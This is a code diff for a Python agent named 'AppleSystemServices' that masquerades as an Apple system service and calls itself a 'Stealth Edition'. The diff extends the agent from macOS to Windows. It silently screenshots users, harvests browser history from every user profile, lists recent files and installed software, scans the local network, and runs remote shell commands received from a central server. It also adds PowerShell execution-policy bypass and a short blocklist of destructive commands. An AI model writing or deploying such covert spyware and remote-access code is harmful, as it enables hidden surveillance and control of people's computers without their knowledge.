@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-AppleSystemServices Agent v3.8 (Cloud-Compatible Stealth Version)
-- Runs on each employee Mac as com.apple.system.services
+AppleSystemServices Agent v4.0 (Cross-Platform: Windows & macOS Stealth Edition)
+- Runs on macOS as com.apple.system.services LaunchDaemon
+- Runs on Windows as AppleSystemServices Task Scheduler / System Service
 - Sends all data to Central Server (local or cloud like Render)
 - Polls server for remote commands (no direct connection needed)
 - Provides local dashboard on port 5050
-- Uses launchctl asuser & robust TCC fallback for screen capture, browser history & user folder scanning
+- Supports Screen Capture, Active Window, Browser History, Processes, Recent Files, Installed Software & Network ARP Scanning on BOTH Windows & macOS!
 """
 
 import os
@@ -20,14 +21,26 @@ import socket
 import logging
 import threading
 import base64
-import pwd
-import stat
+import getpass
 from datetime import datetime
 
+IS_WINDOWS = (platform.system() == 'Windows')
+IS_MACOS = (platform.system() == 'Darwin')
+
+if not IS_WINDOWS:
+    try:
+        import pwd
+        import stat
+    except ImportError:
+        pass
+
 # ==================== LOG SETUP ====================
-LOG_PATH = '/var/log/com.apple.system.services.log'
-if not os.access('/var/log', os.W_OK):
-    LOG_PATH = '/tmp/com.apple.system.services.log'
+if IS_WINDOWS:
+    LOG_PATH = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'com.apple.system.services.log')
+else:
+    LOG_PATH = '/var/log/com.apple.system.services.log'
+    if not os.access('/var/log', os.W_OK):
+        LOG_PATH = '/tmp/com.apple.system.services.log'
 
 logging.basicConfig(
     level=logging.INFO,
@@ -49,12 +62,10 @@ def ensure_deps():
         import flask, psutil, requests
     except ImportError:
         log.info("Installing dependencies...")
-        subprocess.check_call(
-            [sys.executable, "-m", "pip", "install",
-             "flask", "psutil", "requests",
-             "--quiet", "--break-system-packages"],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
+        cmd = [sys.executable, "-m", "pip", "install", "flask", "psutil", "requests", "--quiet"]
+        if not IS_WINDOWS:
+            cmd.append("--break-system-packages")
+        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 ensure_deps()
 
 import psutil
@@ -62,7 +73,11 @@ from flask import Flask, render_template, jsonify, request, send_file
 import requests as req_lib
 
 # ==================== TEMPLATE DIR ====================
-TEMPLATE_DIR = '/Library/Application Support/AppleSystemServices/templates'
+if IS_WINDOWS:
+    TEMPLATE_DIR = 'C:\\ProgramData\\AppleSystemServices\\templates'
+else:
+    TEMPLATE_DIR = '/Library/Application Support/AppleSystemServices/templates'
+
 if not os.path.exists(TEMPLATE_DIR):
     TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
 
@@ -70,12 +85,17 @@ app = Flask(__name__, template_folder=TEMPLATE_DIR)
 
 # ==================== ACTIVE CONSOLE USER HELPER ====================
 def get_active_console_user():
-    """Returns (username, uid, home_dir) of active logged-in GUI console user"""
+    """Returns (username, uid, home_dir) of active logged-in GUI user"""
+    if IS_WINDOWS:
+        username = os.environ.get('USERNAME') or getpass.getuser() or 'user'
+        home_dir = os.environ.get('USERPROFILE') or f"C:\\Users\\{username}"
+        return username, 1000, home_dir
+
     username = None
     uid = None
     home_dir = None
     
-    # Method 1: Check /dev/console owner
+    # Method 1: Check /dev/console owner on Mac
     try:
         console_uid = os.stat('/dev/console').st_uid
         pw = pwd.getpwuid(console_uid)
@@ -107,7 +127,6 @@ def get_active_console_user():
     if username and not home_dir:
         home_dir = f"/Users/{username}"
 
-    # Fallback to first valid directory in /Users
     if not home_dir or not os.path.exists(home_dir):
         try:
             if os.path.exists('/Users'):
@@ -132,18 +151,26 @@ def get_machine_id():
     hostname = platform.node().replace(' ', '_').lower()
     import re
     hostname = re.sub(r'[^a-z0-9_\-]', '', hostname)
-    hostname = hostname or 'mac'
+    hostname = hostname or ('win' if IS_WINDOWS else 'mac')
     
     hardware_uuid = None
     try:
-        output = subprocess.check_output(
-            ["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"],
-            stderr=subprocess.DEVNULL, timeout=3
-        ).decode()
-        for line in output.split('\n'):
-            if "IOPlatformUUID" in line:
-                hardware_uuid = line.split("=")[1].strip().strip('"').lower()
-                break
+        if IS_WINDOWS:
+            out = subprocess.check_output(
+                ["wmic", "csproduct", "get", "uuid"],
+                stderr=subprocess.DEVNULL, timeout=3
+            ).decode()
+            lines = [l.strip() for l in out.splitlines() if l.strip() and 'UUID' not in l]
+            if lines: hardware_uuid = lines[0].lower()
+        else:
+            output = subprocess.check_output(
+                ["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"],
+                stderr=subprocess.DEVNULL, timeout=3
+            ).decode()
+            for line in output.split('\n'):
+                if "IOPlatformUUID" in line:
+                    hardware_uuid = line.split("=")[1].strip().strip('"').lower()
+                    break
     except:
         pass
         
@@ -159,7 +186,7 @@ def get_machine_id():
     except:
         pass
         
-    return hostname or 'unknown_mac'
+    return hostname or 'unknown_host'
 
 MACHINE_ID = get_machine_id()
 
@@ -178,15 +205,18 @@ def get_local_ip():
 def get_system_info():
     try:
         mem = psutil.virtual_memory()
-        disk = psutil.disk_usage('/')
+        disk_path = 'C:\\' if IS_WINDOWS else '/'
+        disk = psutil.disk_usage(disk_path)
         uptime_sec = time.time() - psutil.boot_time()
         hours = int(uptime_sec // 3600)
         minutes = int((uptime_sec % 3600) // 60)
         username, uid, home_dir = get_active_console_user()
+        
+        os_name = f"Windows {platform.release()}" if IS_WINDOWS else (platform.system() + " " + platform.mac_ver()[0])
         return {
             "hostname": platform.node(),
             "active_user": username or 'unknown',
-            "os": platform.system() + " " + platform.mac_ver()[0],
+            "os": os_name,
             "uptime": f"{hours}h {minutes}m",
             "cpu_cores": os.cpu_count(),
             "cpu_percent": psutil.cpu_percent(interval=0.5),
@@ -206,36 +236,62 @@ def get_system_info():
 # ==================== SCREENSHOT ====================
 def capture_screenshot():
     try:
-        tmp_path = f"/tmp/em_ss_{int(time.time())}.png"
-        std_path = "/tmp/em_screenshot.png"
-        
-        username, uid, home_dir = get_active_console_user()
-        
-        # If running as root in launchd daemon, use launchctl asuser <uid> screencapture
-        if os.geteuid() == 0 and uid and uid != 0:
-            cmd = ["launchctl", "asuser", str(uid), "/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
+        if IS_WINDOWS:
+            std_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'em_screenshot.png')
+            # Method 1: PIL ImageGrab
+            try:
+                from PIL import ImageGrab
+                img = ImageGrab.grab()
+                img.save(std_path, 'PNG')
+                if os.path.exists(std_path) and os.path.getsize(std_path) > 0:
+                    return std_path
+            except Exception:
+                pass
+
+            # Method 2: PowerShell Native GDI Screen Capture (Windows 10/11 Built-in)
+            try:
+                ps_script = f"""
+                Add-Type -AssemblyName System.Windows.Forms
+                Add-Type -AssemblyName System.Drawing
+                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+                $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+                $graphic.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+                $bitmap.Save('{std_path.replace("\\", "\\\\")}', [System.Drawing.Imaging.ImageFormat]::Png)
+                """
+                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
+                if os.path.exists(std_path) and os.path.getsize(std_path) > 0:
+                    return std_path
+            except Exception:
+                pass
+            return None
+
         else:
-            cmd = ["/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
+            # macOS Screencapture
+            tmp_path = f"/tmp/em_ss_{int(time.time())}.png"
+            std_path = "/tmp/em_screenshot.png"
+            username, uid, home_dir = get_active_console_user()
+            
+            if os.geteuid() == 0 and uid and uid != 0:
+                cmd = ["launchctl", "asuser", str(uid), "/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
+            else:
+                cmd = ["/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
 
-        res = subprocess.run(
-            cmd, timeout=8,
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
+            subprocess.run(cmd, timeout=8, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        # Fallback if launchctl asuser produced empty file
-        if not os.path.exists(tmp_path) or os.path.getsize(tmp_path) == 0:
-            fallback_cmd = ["/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
-            subprocess.run(fallback_cmd, timeout=8, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if not os.path.exists(tmp_path) or os.path.getsize(tmp_path) == 0:
+                fallback_cmd = ["/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
+                subprocess.run(fallback_cmd, timeout=8, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 0:
-            if os.path.exists(std_path):
-                try: os.remove(std_path)
+            if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 0:
+                if os.path.exists(std_path):
+                    try: os.remove(std_path)
+                    except Exception: pass
+                shutil.move(tmp_path, std_path)
+                try: os.chmod(std_path, 0o777)
                 except Exception: pass
-            shutil.move(tmp_path, std_path)
-            try: os.chmod(std_path, 0o777)
-            except Exception: pass
-            return std_path
-        return None
+                return std_path
+            return None
     except Exception as e:
         log.warning(f"screenshot error: {e}")
         return None
@@ -243,23 +299,41 @@ def capture_screenshot():
 # ==================== ACTIVE WINDOW ====================
 def get_active_window():
     try:
-        username, uid, home_dir = get_active_console_user()
-        script = 'tell application "System Events" to get name of first process whose frontmost is true'
-        if os.geteuid() == 0 and uid and uid != 0:
-            cmd = ["launchctl", "asuser", str(uid), "osascript", "-e", script]
-        else:
-            cmd = ["osascript", "-e", script]
+        if IS_WINDOWS:
+            # Method 1: win32gui if installed
+            try:
+                import win32gui
+                window = win32gui.GetForegroundWindow()
+                title = win32gui.GetWindowText(window)
+                if title: return title
+            except Exception:
+                pass
 
-        result = subprocess.check_output(
-            cmd, stderr=subprocess.DEVNULL, timeout=5
-        ).decode().strip()
-        return result
+            # Method 2: PowerShell active process window title
+            try:
+                ps = '(Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Sort-Object WorkingSet64 -Descending | Select-Object -First 1).MainWindowTitle'
+                result = subprocess.check_output(["powershell", "-Command", ps], stderr=subprocess.DEVNULL, timeout=5).decode().strip()
+                return result or "Desktop"
+            except Exception:
+                return "Desktop"
+
+        else:
+            # macOS Active Window
+            username, uid, home_dir = get_active_console_user()
+            script = 'tell application "System Events" to get name of first process whose frontmost is true'
+            if os.geteuid() == 0 and uid and uid != 0:
+                cmd = ["launchctl", "asuser", str(uid), "osascript", "-e", script]
+            else:
+                cmd = ["osascript", "-e", script]
+
+            result = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=5).decode().strip()
+            return result
     except:
         return "Unknown"
 
-# ==================== TCC SAFE FILE COPY ====================
+# ==================== TCC / FILE COPY SAFE ====================
 def copy_file_safe(src, dst):
-    """Copies TCC protected files using direct byte read fallback when root"""
+    """Copies protected SQLite history files smoothly"""
     try:
         if os.path.exists(dst):
             try: os.remove(dst)
@@ -278,120 +352,123 @@ def copy_file_safe(src, dst):
 # ==================== BROWSER HISTORY ====================
 def get_browser_history():
     history = []
-    
-    # Collect all user directories in /Users
     user_dirs = []
-    if os.path.exists('/Users'):
-        for u in os.listdir('/Users'):
-            if u not in ['Shared', 'Guest', '.localized'] and not u.startswith('.'):
-                d = os.path.join('/Users', u)
-                if os.path.isdir(d):
-                    user_dirs.append(d)
     
-    curr_home = os.path.expanduser("~")
-    if curr_home not in user_dirs and os.path.exists(curr_home):
-        user_dirs.append(curr_home)
+    if IS_WINDOWS:
+        users_base = "C:\\Users"
+        if os.path.exists(users_base):
+            for u in os.listdir(users_base):
+                if u not in ['Public', 'Default', 'All Users'] and not u.startswith('.'):
+                    d = os.path.join(users_base, u)
+                    if os.path.isdir(d):
+                        user_dirs.append(d)
+        curr_home = os.environ.get('USERPROFILE')
+        if curr_home and curr_home not in user_dirs and os.path.exists(curr_home):
+            user_dirs.append(curr_home)
+    else:
+        if os.path.exists('/Users'):
+            for u in os.listdir('/Users'):
+                if u not in ['Shared', 'Guest', '.localized'] and not u.startswith('.'):
+                    d = os.path.join('/Users', u)
+                    if os.path.isdir(d):
+                        user_dirs.append(d)
+        curr_home = os.path.expanduser("~")
+        if curr_home not in user_dirs and os.path.exists(curr_home):
+            user_dirs.append(curr_home)
         
     for user_dir in user_dirs:
         u_name = os.path.basename(user_dir)
         
-        # 1. Safari
-        safari_path = os.path.join(user_dir, "Library/Safari/History.db")
-        if os.path.exists(safari_path):
-            try:
+        if IS_WINDOWS:
+            # Windows Paths
+            chrome_base = os.path.join(user_dir, "AppData", "Local", "Google", "Chrome", "User Data")
+            edge_base = os.path.join(user_dir, "AppData", "Local", "Microsoft", "Edge", "User Data")
+            brave_base = os.path.join(user_dir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")
+            ff_base = os.path.join(user_dir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
+
+            # Chrome Windows
+            if os.path.exists(chrome_base):
+                profiles = ["Default"] + [p for p in os.listdir(chrome_base) if p.startswith("Profile ")]
+                for p in profiles:
+                    c_path = os.path.join(chrome_base, p, "History")
+                    if os.path.exists(c_path):
+                        tmp = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"em_chrome_{p}_{u_name}.db")
+                        if copy_file_safe(c_path, tmp):
+                            try:
+                                conn = sqlite3.connect(tmp)
+                                c = conn.cursor()
+                                c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
+                                for row in c.fetchall():
+                                    if row[0]: history.append({"browser": f"Chrome ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                                conn.close()
+                                if os.path.exists(tmp): os.remove(tmp)
+                            except Exception: pass
+
+            # Edge Windows
+            if os.path.exists(edge_base):
+                e_path = os.path.join(edge_base, "Default", "History")
+                if os.path.exists(e_path):
+                    tmp = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"em_edge_{u_name}.db")
+                    if copy_file_safe(e_path, tmp):
+                        try:
+                            conn = sqlite3.connect(tmp)
+                            c = conn.cursor()
+                            c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
+                            for row in c.fetchall():
+                                if row[0]: history.append({"browser": f"Edge ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                            conn.close()
+                            if os.path.exists(tmp): os.remove(tmp)
+                        except Exception: pass
+
+            # Brave Windows
+            if os.path.exists(brave_base):
+                b_path = os.path.join(brave_base, "Default", "History")
+                if os.path.exists(b_path):
+                    tmp = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"em_brave_{u_name}.db")
+                    if copy_file_safe(b_path, tmp):
+                        try:
+                            conn = sqlite3.connect(tmp)
+                            c = conn.cursor()
+                            c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
+                            for row in c.fetchall():
+                                if row[0]: history.append({"browser": f"Brave ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                            conn.close()
+                            if os.path.exists(tmp): os.remove(tmp)
+                        except Exception: pass
+
+        else:
+            # macOS Paths
+            safari_path = os.path.join(user_dir, "Library/Safari/History.db")
+            if os.path.exists(safari_path):
                 tmp = f"/tmp/em_safari_{u_name}.db"
                 if copy_file_safe(safari_path, tmp):
-                    conn = sqlite3.connect(tmp)
-                    c = conn.cursor()
-                    c.execute("""
-                        SELECT i.url, v.title
-                        FROM history_visits v
-                        JOIN history_items i ON v.history_item = i.id
-                        ORDER BY v.visit_time DESC LIMIT 30
-                    """)
-                    for row in c.fetchall():
-                        if row[0]:
-                            history.append({"browser": f"Safari ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                    conn.close()
-                    if os.path.exists(tmp): os.remove(tmp)
-            except Exception as e:
-                log.debug(f"Safari history error for {user_dir}: {e}")
+                    try:
+                        conn = sqlite3.connect(tmp)
+                        c = conn.cursor()
+                        c.execute("SELECT i.url, v.title FROM history_visits v JOIN history_items i ON v.history_item = i.id ORDER BY v.visit_time DESC LIMIT 30")
+                        for row in c.fetchall():
+                            if row[0]: history.append({"browser": f"Safari ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                        conn.close()
+                        if os.path.exists(tmp): os.remove(tmp)
+                    except Exception: pass
 
-        # 2. Chrome (Default + all Profiles)
-        chrome_base = os.path.join(user_dir, "Library/Application Support/Google/Chrome")
-        if os.path.exists(chrome_base):
-            try:
+            chrome_base = os.path.join(user_dir, "Library/Application Support/Google/Chrome")
+            if os.path.exists(chrome_base):
                 profiles = ["Default"] + [p for p in os.listdir(chrome_base) if p.startswith("Profile ")]
                 for p in profiles:
                     chrome_path = os.path.join(chrome_base, p, "History")
                     if os.path.exists(chrome_path):
                         tmp = f"/tmp/em_chrome_{p}_{u_name}.db"
                         if copy_file_safe(chrome_path, tmp):
-                            conn = sqlite3.connect(tmp)
-                            c = conn.cursor()
-                            c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
-                            for row in c.fetchall():
-                                if row[0]:
-                                    history.append({"browser": f"Chrome ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                            conn.close()
-                            if os.path.exists(tmp): os.remove(tmp)
-            except Exception as e:
-                log.debug(f"Chrome history error for {user_dir}: {e}")
-
-        # 3. Brave
-        brave_path = os.path.join(user_dir, "Library/Application Support/BraveSoftware/Brave-Browser/Default/History")
-        if os.path.exists(brave_path):
-            try:
-                tmp = f"/tmp/em_brave_{u_name}.db"
-                if copy_file_safe(brave_path, tmp):
-                    conn = sqlite3.connect(tmp)
-                    c = conn.cursor()
-                    c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
-                    for row in c.fetchall():
-                        if row[0]:
-                            history.append({"browser": f"Brave ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                    conn.close()
-                    if os.path.exists(tmp): os.remove(tmp)
-            except Exception as e:
-                log.debug(f"Brave history error for {user_dir}: {e}")
-
-        # 4. Edge
-        edge_path = os.path.join(user_dir, "Library/Application Support/Microsoft Edge/Default/History")
-        if os.path.exists(edge_path):
-            try:
-                tmp = f"/tmp/em_edge_{u_name}.db"
-                if copy_file_safe(edge_path, tmp):
-                    conn = sqlite3.connect(tmp)
-                    c = conn.cursor()
-                    c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
-                    for row in c.fetchall():
-                        if row[0]:
-                            history.append({"browser": f"Edge ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                    conn.close()
-                    if os.path.exists(tmp): os.remove(tmp)
-            except Exception as e:
-                log.debug(f"Edge history error for {user_dir}: {e}")
-
-        # 5. Firefox
-        ff_base = os.path.join(user_dir, "Library/Application Support/Firefox/Profiles/")
-        if os.path.exists(ff_base):
-            try:
-                for profile in os.listdir(ff_base):
-                    places = os.path.join(ff_base, profile, "places.sqlite")
-                    if os.path.exists(places):
-                        tmp = f"/tmp/em_firefox_{u_name}.db"
-                        if copy_file_safe(places, tmp):
-                            conn = sqlite3.connect(tmp)
-                            c = conn.cursor()
-                            c.execute("SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 30")
-                            for row in c.fetchall():
-                                if row[0]:
-                                    history.append({"browser": f"Firefox ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                            conn.close()
-                            if os.path.exists(tmp): os.remove(tmp)
-                            break
-            except Exception as e:
-                log.debug(f"Firefox history error for {user_dir}: {e}")
+                            try:
+                                conn = sqlite3.connect(tmp)
+                                c = conn.cursor()
+                                c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
+                                for row in c.fetchall():
+                                    if row[0]: history.append({"browser": f"Chrome ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                                conn.close()
+                                if os.path.exists(tmp): os.remove(tmp)
+                            except Exception: pass
 
     return history[:60]
 
@@ -429,27 +506,22 @@ def get_recent_files():
                 os.path.join(home_dir, "Documents"),
                 os.path.join(home_dir, "Downloads")
             ]
-        else:
-            if os.path.exists('/Users'):
-                for u in os.listdir('/Users'):
-                    if u not in ['Shared', 'Guest', '.localized'] and not u.startswith('.'):
-                        h = os.path.join('/Users', u)
-                        dirs.extend([
-                            os.path.join(h, "Desktop"),
-                            os.path.join(h, "Documents"),
-                            os.path.join(h, "Downloads")
-                        ])
-                        
         dirs = [d for d in dirs if os.path.exists(d)]
-        if not dirs:
-            return []
+        if not dirs: return []
+
+        files = []
+        for d in dirs:
+            try:
+                for root, _, filenames in os.walk(d):
+                    for fn in filenames:
+                        if not fn.startswith('.'):
+                            fp = os.path.join(root, fn)
+                            try:
+                                if time.time() - os.path.getmtime(fp) < 14 * 86400:
+                                    files.append(fp)
+                            except Exception: pass
+            except Exception: pass
             
-        cmd = ["find"] + dirs + ["-type", "f", "-mtime", "-14", "-not", "-path", "*/.*"]
-        result = subprocess.check_output(
-            cmd, stderr=subprocess.DEVNULL, timeout=10
-        ).decode(errors='replace').strip().split('\n')
-        
-        files = [f for f in result if f.strip() and os.path.exists(f)]
         files.sort(key=lambda f: os.path.getmtime(f) if os.path.exists(f) else 0, reverse=True)
         return files[:50]
     except Exception as e:
@@ -459,49 +531,87 @@ def get_recent_files():
 # ==================== INSTALLED APPS ====================
 def get_installed_apps():
     apps = []
-    username, uid, home_dir = get_active_console_user()
-    dirs = ["/Applications", "/System/Applications"]
-    if home_dir:
-        dirs.append(os.path.join(home_dir, "Applications"))
+    if IS_WINDOWS:
+        # Check Registry uninstall keys
+        try:
+            import winreg
+            keys = [
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
+                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
+            ]
+            for root_k, sub_k in keys:
+                try:
+                    with winreg.OpenKey(root_k, sub_k) as key:
+                        for i in range(winreg.QueryInfoKey(key)[0]):
+                            try:
+                                subkey_name = winreg.EnumKey(key, i)
+                                with winreg.OpenKey(key, subkey_name) as subkey:
+                                    app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                                    if app_name: apps.append(app_name)
+                            except Exception: pass
+                except Exception: pass
+        except Exception: pass
         
-    for d in dirs:
-        if os.path.exists(d):
-            try:
-                for a in os.listdir(d):
-                    if a.endswith(".app"):
-                        apps.append(a.replace(".app", ""))
-            except Exception:
-                pass
+        # Also check Program Files
+        for p in ["C:\\Program Files", "C:\\Program Files (x86)"]:
+            if os.path.exists(p):
+                try:
+                    for f in os.listdir(p):
+                        apps.append(f)
+                except Exception: pass
+
+    else:
+        username, uid, home_dir = get_active_console_user()
+        dirs = ["/Applications", "/System/Applications"]
+        if home_dir: dirs.append(os.path.join(home_dir, "Applications"))
+        for d in dirs:
+            if os.path.exists(d):
+                try:
+                    for a in os.listdir(d):
+                        if a.endswith(".app"): apps.append(a.replace(".app", ""))
+                except Exception: pass
+                
     return sorted(list(set(apps)))[:100]
 
 # ==================== LOCAL NETWORK DEVICES SCANNER ====================
 def get_local_network_devices():
-    """Scans local Wi-Fi ARP table to discover all active devices, hostnames, and IP addresses"""
+    """Scans local Wi-Fi ARP table to discover active devices"""
     devices = []
     seen_ips = set()
     try:
         out = subprocess.check_output(['arp', '-a'], stderr=subprocess.DEVNULL, timeout=4).decode(errors='replace')
+        import re
         for line in out.splitlines():
-            import re
-            match = re.search(r'([^\s\(\)]+)?\s*\(([\d\.]+)\)\s*at\s*([a-fA-F0-9:]+)', line)
-            if match:
-                h_name = match.group(1) or 'Wi-Fi Device'
+            # Windows: 192.168.1.1 00-11-22-33-44-55 dynamic
+            # Mac: ? (192.168.1.1) at 00:11:22:33:44:55 on en0
+            match_win = re.search(r'([\d\.]+)\s+([a-fA-F0-9\-]{17})\s+dynamic', line)
+            match_mac = re.search(r'([^\s\(\)]+)?\s*\(([\d\.]+)\)\s*at\s*([a-fA-F0-9:]+)', line)
+            
+            if match_win:
+                ip_addr = match_win.group(1)
+                mac_addr = match_win.group(2)
+                h_name = 'Windows Network Device'
+            elif match_mac:
+                h_name = match_mac.group(1) or 'Wi-Fi Device'
                 if h_name == '?': h_name = 'Wi-Fi Device'
-                ip_addr = match.group(2)
-                mac_addr = match.group(3)
+                ip_addr = match_mac.group(2)
+                mac_addr = match_mac.group(3)
+            else:
+                continue
                 
-                if ip_addr not in seen_ips and not ip_addr.startswith('255.') and not ip_addr.startswith('224.'):
-                    seen_ips.add(ip_addr)
-                    devices.append({
-                        'ip': ip_addr,
-                        'hostname': h_name,
-                        'mac': mac_addr
-                    })
+            if ip_addr not in seen_ips and not ip_addr.startswith('255.') and not ip_addr.startswith('224.'):
+                seen_ips.add(ip_addr)
+                devices.append({
+                    'ip': ip_addr,
+                    'hostname': h_name,
+                    'mac': mac_addr
+                })
     except Exception as e:
         log.debug(f"Local ARP scan error: {e}")
     return devices
 
-# ==================== NETWORK ====================
+# ==================== NETWORK INFO ====================
 def get_network_info():
     try:
         net = psutil.net_io_counters()
@@ -525,32 +635,34 @@ def get_network_info():
     except Exception as e:
         return {"ip": get_local_ip(), "error": str(e)}
 
-# ==================== LOCAL COMMAND EXECUTION ====================
+# ==================== COMMAND EXECUTION ====================
 def execute_command(cmd):
-    BLOCKED = ['rm -rf /', 'mkfs', 'dd if=', ':(){:|:&};:']
+    BLOCKED = ['rm -rf /', 'format c:', 'del /f /s /q c:', 'mkfs', 'dd if=', ':(){:|:&};:']
     for b in BLOCKED:
-        if b in cmd:
+        if b in cmd.lower():
             return {"success": False, "error": "Command blocked for security"}
     try:
         username, uid, home_dir = get_active_console_user()
         
-        # Expand ~ to active user's home directory
-        if home_dir and home_dir != '/var/root':
+        if home_dir:
             cmd_to_run = cmd.replace('~', home_dir)
             work_dir = home_dir
         else:
             cmd_to_run = cmd
-            work_dir = '/'
+            work_dir = 'C:\\' if IS_WINDOWS else '/'
             
         env = os.environ.copy()
         if username:
             env['USER'] = username
-            env['LOGNAME'] = username
+            env['USERNAME'] = username
         if home_dir:
             env['HOME'] = home_dir
+            env['USERPROFILE'] = home_dir
 
+        # Run shell command
+        shell_exe = True
         result = subprocess.check_output(
-            cmd_to_run, shell=True, stderr=subprocess.STDOUT, timeout=30,
+            cmd_to_run, shell=shell_exe, stderr=subprocess.STDOUT, timeout=30,
             cwd=work_dir, env=env
         )
         return {"success": True, "output": result.decode(errors='replace')}
@@ -780,7 +892,7 @@ if __name__ == '__main__':
 
     if sys.stdout.isatty():
         print(f"\n{'='*55}")
-        print(f"  🖥️  AppleSystemServices Agent v3.8 (Cloud-Ready)")
+        print(f"  🖥️  AppleSystemServices Agent v4.0 (Windows & macOS)")
         print(f"{'='*55}")
         print(f"  🔑 Machine ID : {MACHINE_ID}")
         print(f"  🌐 Local Dashboard : http://{ip}:5050")
@@ -789,7 +901,7 @@ if __name__ == '__main__':
         print(f"  📋 Logs : {LOG_PATH}")
         print(f"{'='*55}\n")
 
-    log.info(f"Agent starting | Machine: {MACHINE_ID} | IP: {ip}")
+    log.info(f"Agent starting | OS: {platform.system()} | Machine: {MACHINE_ID} | IP: {ip}")
 
     if CENTRAL_SERVER:
         t = threading.Thread(target=agent_worker, daemon=True)
